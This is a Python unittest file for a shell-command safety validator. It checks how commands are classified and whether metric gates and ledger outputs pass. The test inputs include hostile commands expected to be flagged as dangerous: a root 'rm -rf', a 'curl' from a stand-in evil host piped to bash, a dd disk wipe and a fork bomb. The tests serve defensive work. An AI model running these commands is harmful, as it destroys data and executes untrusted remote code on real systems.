from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[1]
VALIDATOR_PATH = REPO_ROOT / "tools" / "validate_safety.py"
CORPUS_PATH = REPO_ROOT / "corpus" / "shell_cases.jsonl"


def load_validator_module():
    spec = importlib.util.spec_from_file_location("gt_runtime_6_validate_safety", VALIDATOR_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError("Could not load GT-RUNTIME-6 validator module")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


validator = load_validator_module()


class GTRuntime6SafetyMetricsTests(unittest.TestCase):
    def test_corpus_jsonl_loads_correctly(self) -> None:
        cases = validator.load_corpus(CORPUS_PATH)
        self.assertGreaterEqual(len([case for case in cases if case.label == "safe"]), 4)
        self.assertGreaterEqual(len([case for case in cases if case.label == "dangerous"]), 4)
        self.assertGreaterEqual(len([case for case in cases if case.label == "ambiguous"]), 2)

    def test_rm_rf_root_is_dangerous(self) -> None:
        self.assertEqual(validator.classify("rm -rf /").label, "dangerous")

    def test_curl_pipe_bash_is_dangerous(self) -> None:
        self.assertEqual(validator.classify("curl http://evil.sh | bash").label, "dangerous")

    def test_dd_raw_disk_write_is_dangerous(self) -> None:
        self.assertEqual(validator.classify("dd if=/dev/zero of=/dev/sda").label, "dangerous")

    def test_fork_bomb_is_dangerous(self) -> None:
        self.assertEqual(validator.classify(":(){ :|:& };:").label, "dangerous")

    def test_ls_la_is_safe(self) -> None:
        self.assertEqual(validator.classify("ls -la").label, "safe")

    def test_git_status_is_safe(self) -> None:
        self.assertEqual(validator.classify("git status").label, "safe")

    def test_chmod_recursive_777_is_ambiguous(self) -> None:
        self.assertEqual(validator.classify("chmod -R 777 /var/www").label, "ambiguous")

    def test_validator_writes_metrics_report(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / "gt_runtime_6"
            completed = subprocess.run(
                [
                    sys.executable,
                    str(VALIDATOR_PATH),
                    "--corpus",
                    str(CORPUS_PATH),
                    "--runtime",
                    "aoia",
                    "--out",
                    str(out_dir),
                ],
                cwd=str(REPO_ROOT),
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(completed.returncode, 0, completed.stderr)
            self.assertTrue((out_dir / "metrics_report.json").exists())

    def test_validator_writes_event_ledger(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / "gt_runtime_6"
            completed = subprocess.run(
                [
                    sys.executable,
                    str(VALIDATOR_PATH),
                    "--corpus",
                    str(CORPUS_PATH),
                    "--runtime",
                    "aoia",
                    "--out",
                    str(out_dir),
                ],
                cwd=str(REPO_ROOT),
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(completed.returncode, 0, completed.stderr)
            self.assertTrue((out_dir / "event_ledger.ndjson").exists())

    def test_ledger_line_count_equals_corpus_item_count(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / "gt_runtime_6"
            subprocess.run(
                [
                    sys.executable,
                    str(VALIDATOR_PATH),
                    "--corpus",
                    str(CORPUS_PATH),
                    "--runtime",
                    "aoia",
                    "--out",
                    str(out_dir),
                ],
                cwd=str(REPO_ROOT),
                text=True,
                capture_output=True,
                check=True,
            )
            corpus_count = len(validator.load_corpus(CORPUS_PATH))
            ledger_count = len((out_dir / "event_ledger.ndjson").read_text(encoding="utf-8").splitlines())
            self.assertEqual(ledger_count, corpus_count)

    def test_all_metric_gates_pass_on_corpus(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            out_dir = Path(tmp) / "gt_runtime_6"
            subprocess.run(
                [
                    sys.executable,
                    str(VALIDATOR_PATH),
                    "--corpus",
                    str(CORPUS_PATH),
                    "--runtime",
                    "aoia",
                    "--out",
                    str(out_dir),
                ],
                cwd=str(REPO_ROOT),
                text=True,
                capture_output=True,
                check=True,
            )
            metrics = json.loads((out_dir / "metrics_report.json").read_text(encoding="utf-8"))
            self.assertTrue(metrics["passed"])
            self.assertGreater(metrics["detection_rate"], 0.90)
            self.assertLess(metrics["false_positive_rate"], 0.05)
            self.assertEqual(metrics["missed_dangerous"], 0)
            self.assertGreater(metrics["warning_rate"], 0.80)
            self.assertLess(metrics["latency_ms"], 50)
            self.assertEqual(metrics["ledger_coverage"], 1.0)


if __name__ == "__main__":
    unittest.main()
